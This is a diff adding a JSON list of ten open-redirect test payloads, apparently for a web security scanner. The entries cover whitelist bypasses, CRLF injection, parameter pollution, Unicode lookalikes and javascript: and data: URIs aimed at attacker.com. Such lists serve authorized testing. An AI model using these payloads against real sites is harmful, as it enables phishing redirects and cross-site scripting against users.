@@ -1,0 +1,12 @@
+[
+  {"name":"Basic Redirect","category":"Open Redirect","description":"Simple open redirect","payload":"https://target.com/redirect?url=https://attacker.com","tags":["basic"]},
+  {"name":"Double Slash","category":"Open Redirect","description":"Protocol relative URL bypass","payload":"//attacker.com","tags":["protocol-relative","bypass"]},
+  {"name":"Backslash Bypass","category":"Open Redirect","description":"Backslash for bypass","payload":"https://target.com/redirect?url=\\\\attacker.com","tags":["backslash","bypass"]},
+  {"name":"JavaScript Protocol","category":"Open Redirect","description":"javascript: URI for XSS chain","payload":"javascript:alert(document.domain)","tags":["javascript","xss-chain"]},
+  {"name":"Data URI Redirect","category":"Open Redirect","description":"data: URI redirect","payload":"data:text/html,<script>window.location='https://attacker.com'</script>","tags":["data-uri","xss"]},
+  {"name":"Parameter Pollution","category":"Open Redirect","description":"HPP to inject second URL param","payload":"https://target.com/redirect?url=safe.com&url=attacker.com","tags":["hpp","pollution"]},
+  {"name":"CRLF in URL","category":"Open Redirect","description":"CRLF injection with redirect","payload":"https://target.com/redirect?url=%0d%0aLocation:%20https://attacker.com","tags":["crlf","injection"]},
+  {"name":"Whitelisted Domain Bypass","category":"Open Redirect","description":"Bypass domain whitelist with @","payload":"https://target.com/redirect?url=https://target.com@attacker.com","tags":["at-sign","whitelist-bypass"]},
+  {"name":"Unicode Normalization","category":"Open Redirect","description":"Unicode characters that normalize","payload":"https://target.com/redirect?url=https://attɑcker.com","tags":["unicode","normalization"]},
+  {"name":"Subdomain Confusion","category":"Open Redirect","description":"Subomain of attacker looks like target","payload":"https://target.com/redirect?url=https://target.com.attacker.com","tags":["subdomain","confusion"]}
+]
